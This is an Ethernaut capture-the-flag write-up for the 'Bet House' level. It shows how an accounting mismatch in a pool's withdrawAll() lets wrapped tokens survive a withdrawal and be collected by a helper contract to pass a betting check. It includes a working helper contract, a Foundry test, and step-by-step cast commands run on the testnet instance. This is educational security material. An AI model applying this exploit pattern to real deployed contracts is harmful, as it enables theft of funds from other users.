# Ethernaut Challenge 34 — Bet House

Welcome to the Bet House.

You start with 5 Pool Deposit Tokens (PDT).

Could you master the art of strategic gambling and become a bettor?

Instance address:

```text
0xbbEA21974e1132F7Ff0C10Df5b64f1A1E327AC49
````

```bash
BET_HOUSE=0xbbEA21974e1132F7Ff0C10Df5b64f1A1E327AC49
```

---

## 🎯 Goal

The challenge is solved when my address is marked as a bettor in the `BetHouse` contract.

The relevant function is:

```solidity
function makeBet(address bettor_) external {
    if (Pool(pool).balanceOf(msg.sender) < BET_PRICE) {
        revert InsufficientFunds();
    }
    if (!Pool(pool).depositsLocked(msg.sender)) revert FundsNotLocked();
    bettors[bettor_] = true;
}
```

To pass this function:

* `msg.sender` must have at least `20` wrapped tokens
* `msg.sender` must have locked deposits
* the address stored as bettor is `bettor_`, which is a function argument and not necessarily `msg.sender`

That last detail is the key to the challenge.

---

## 🧠 Thought process

At first glance, it looks impossible to reach `BET_PRICE = 20`.

The pool only lets us mint wrapped tokens through `deposit()`:

* depositing `0.001 ether` mints `10` wrapped tokens
* depositing `5 PDT` mints `5` wrapped tokens
* total available seems to be only `15`

So the first instinct is that we can never reach the required `20`.

However, the bug is not in the mint amount itself.

The real issue is that the `Pool` contract tracks:

* deposited assets in internal mappings
* wrapped token balances in a separate ERC20 token

Those two things can diverge.

The critical function is `withdrawAll()`:

```solidity
function withdrawAll() external nonReentrant {
    // send the PDT to the user
    uint256 _depositedValue = depositedPDT[msg.sender];
    if (_depositedValue > 0) {
        depositedPDT[msg.sender] = 0;
        PoolToken(depositToken).transfer(msg.sender, _depositedValue);
    }

    // send the ether to the user
    _depositedValue = depositedEther[msg.sender];
    if (_depositedValue > 0) {
        depositedEther[msg.sender] = 0;
        payable(msg.sender).call{value: _depositedValue}("");
    }

    PoolToken(wrappedToken).burn(msg.sender, balanceOf(msg.sender));
}
```

The flaw is:

* the pool returns deposited assets based on `depositedPDT[msg.sender]` and `depositedEther[msg.sender]`
* but it burns wrapped tokens based on `wrappedToken.balanceOf(msg.sender)`

So if a user transfers away their wrapped tokens before calling `withdrawAll()`, they can:

1. recover their deposited assets
2. keep the wrapped tokens alive in another address

That allows wrapped tokens to be accumulated elsewhere.

---

## 🔍 Initial reconnaissance

Get the pool address:

```bash
cast call $BET_HOUSE \
    "pool()(address)" \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:

```text
0xaa84cfD3c27815E86C76cb8b5c382C1fa32Eeaf8
```

```bash
POOL=0xaa84cfD3c27815E86C76cb8b5c382C1fa32Eeaf8
```

My address:

```bash
MY_ADDRESS=0xeCF94300dD67bB8c31F41BE3a2136D3f0abFb0B0
```

Check the current wrapped token balance tracked by the pool:

```bash
cast call $POOL \
    "balanceOf(address)(uint256)" $MY_ADDRESS \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:

```text
0
```

So we need to increase our wrapped token balance.

---

## 🪙 Inspect the wrapped token

Get the wrapped token address:

```bash
cast call $POOL \
    "wrappedToken()(address)" \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:

```text
0x17aC6f42B28b4a26C832B22e609E664705F6f576
```

```bash
WRAPPED_TOKEN=0x17aC6f42B28b4a26C832B22e609E664705F6f576
```

Check who owns it:

```bash
cast call $WRAPPED_TOKEN \
    "owner()(address)" \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:

```text
0xaa84cfD3c27815E86C76cb8b5c382C1fa32Eeaf8
```

So the pool contract is the owner of the wrapped token and is the only contract allowed to mint and burn it.

Check my current balance:

```bash
cast call $WRAPPED_TOKEN \
    "balanceOf(address)(uint256)" $MY_ADDRESS \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:

```text
0
```

---

## 🪙 Inspect the deposit token

Get the PDT token address:

```bash
cast call $POOL \
    "depositToken()(address)" \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:

```text
0x43acFc32a08AAEf161FeF55A4691E5C9fE6393f2
```

```bash
DEPOSIT_TOKEN=0x43acFc32a08AAEf161FeF55A4691E5C9fE6393f2
```

Check my PDT balance:

```bash
cast call $DEPOSIT_TOKEN \
    "balanceOf(address)(uint256)" $MY_ADDRESS \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:

```text
5
```

Check total supply:

```bash
cast call $DEPOSIT_TOKEN \
    "totalSupply()(uint256)" \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:

```text
5
```

Check wrapped token total supply before starting:

```bash
cast call $WRAPPED_TOKEN \
    "totalSupply()(uint256)" \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:

```text
0
```

So initially it really looks like the maximum mintable amount is only:

* `10` from the ETH deposit
* `5` from the PDT deposit

for a total of `15`.

That is exactly what makes the bug in `withdrawAll()` important.

---

## 💥 Vulnerability

The exploit works because:

1. I deposit `0.001 ether` and `5 PDT` to mint `15` wrapped tokens.
2. I transfer those `15` wrapped tokens to a helper contract.
3. I call `withdrawAll()` from my EOA.
4. Since my EOA no longer holds the wrapped tokens, the burn amount is `0`.
5. I still recover my original `5 PDT` and `0.001 ether`.
6. I deposit the `5 PDT` again to mint `5` more wrapped tokens.
7. I transfer those `5` wrapped tokens to the same helper contract.
8. The helper contract now holds `20` wrapped tokens.
9. The helper locks its deposits and calls `makeBet(myAddress)`.
10. `msg.sender` passes the checks, but the bettor recorded is my address.

So the challenge is solved by abusing the mismatch between:

* deposit accounting in the pool
* transferable wrapped token balances
* and the fact that `makeBet()` credits `bettor_`, not `msg.sender`

---

## 🧪 Local proof of concept

I first reproduced the exploit locally in the test file [`BetHouseTest.t.sol`](../../test/challenge-34-bet-house/BetHouseTest.t.sol).

The helper contract used in the exploit is [`BetHouseHelper`](./BetHouseHelper.sol):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBetHouse {
    function makeBet(address bettor_) external;
}

interface IPool {
    function lockDeposits() external;
}

contract BetHouseHelper {
    IPool public pool;
    IBetHouse public betHouse;

    constructor(address _pool, address _betHouse) {
        pool = IPool(_pool);
        betHouse = IBetHouse(_betHouse);
    }

    function lockAndBet(address targetBettor) external {
        pool.lockDeposits();
        betHouse.makeBet(targetBettor);
    }
}
```

The core test is:

```solidity
function testMakeAliceBettor() public {
    vm.startPrank(alice);
    depositToken.approve(address(pool), 5);
    pool.deposit{value: 0.001 ether}(5);
    vm.stopPrank();

    vm.startPrank(alice);
    wrappedToken.transfer(address(helper), wrappedToken.balanceOf(alice));
    vm.stopPrank();

    vm.startPrank(alice);
    pool.withdrawAll();
    vm.stopPrank();

    vm.startPrank(alice);
    depositToken.approve(address(pool), 5);
    pool.deposit(5);
    vm.stopPrank();

    vm.startPrank(alice);
    wrappedToken.transfer(address(helper), wrappedToken.balanceOf(alice));
    vm.stopPrank();

    helper.lockAndBet(alice);

    assertTrue(betHouse.isBettor(alice));
}
```

This proves that a second address can accumulate `20` wrapped tokens even though only `15` seem available at first.

---

## 🚀 Exploit on Sepolia

### 1. Deploy the helper contract

Deploy the helper:

```bash
forge create src/challenge-34-bet-house/BetHouseHelper.sol:BetHouseHelper \
  --rpc-url $SEPOLIA_RPC_URL \
  --account ethernaut \
  --broadcast \
  --constructor-args $POOL $BET_HOUSE
```

Deployed helper:

```text
0x195C7D6048dCbB0801e9b0726B6D6546FBb688c5
```

```bash
HELPER=0x195C7D6048dCbB0801e9b0726B6D6546FBb688c5
```

---

### 2. First deposit: mint 15 wrapped tokens

Approve the pool to spend the 5 PDT:

```bash
cast send $DEPOSIT_TOKEN \
    "approve(address,uint256)" \
    $POOL 5 \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

Deposit `5 PDT` and `0.001 ether`:

```bash
cast send $POOL \
    "deposit(uint256)" \
    5 \
    --value 0.001ether \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

Check wrapped token balance:

```bash
cast call $WRAPPED_TOKEN \
    "balanceOf(address)(uint256)" $MY_ADDRESS \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:

```text
15
```

---

### 3. Transfer the 15 wrapped tokens to the helper

```bash
cast send $WRAPPED_TOKEN \
    "transfer(address,uint256)" \
    $HELPER 15 \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

---

### 4. Withdraw the deposited assets

Now call `withdrawAll()` from the original address:

```bash
cast send $POOL \
    "withdrawAll()" \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

This returns:

* the `5 PDT`
* the deposited `0.001 ether`

But because the wrapped tokens were already moved to the helper, nothing meaningful is burned from my EOA.

---

### 5. Deposit the 5 PDT again

Approve once more:

```bash
cast send $DEPOSIT_TOKEN \
    "approve(address,uint256)" \
    $POOL 5 \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

Deposit the 5 PDT again:

```bash
cast send $POOL \
    "deposit(uint256)" \
    5 \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

Check wrapped token balance:

```bash
cast call $WRAPPED_TOKEN \
    "balanceOf(address)(uint256)" $MY_ADDRESS \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:

```text
5
```

---

### 6. Transfer the extra 5 wrapped tokens to the helper

```bash
cast send $WRAPPED_TOKEN \
    "transfer(address,uint256)" \
    $HELPER 5 \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

At this point the helper contract holds `20` wrapped tokens in total.

---

### 7. Lock deposits and place the bet through the helper

Call:

```bash
cast send $HELPER \
    "lockAndBet(address)" \
    $MY_ADDRESS \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

This helper function does:

```solidity
function lockAndBet(address targetBettor) external {
    pool.lockDeposits();
    betHouse.makeBet(targetBettor);
}
```

So:

* the helper is the `msg.sender`
* the helper holds `20` wrapped tokens
* the helper locks its deposits
* the helper calls `makeBet($MY_ADDRESS)`

That means the checks are performed on the helper, but the bettor recorded is my address.

---

## ✅ Verify the result

Check whether my address is now a bettor:

```bash
cast call $BET_HOUSE \
    "isBettor(address)(bool)" \
    $MY_ADDRESS \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:

```text
true
```

Challenge solved.


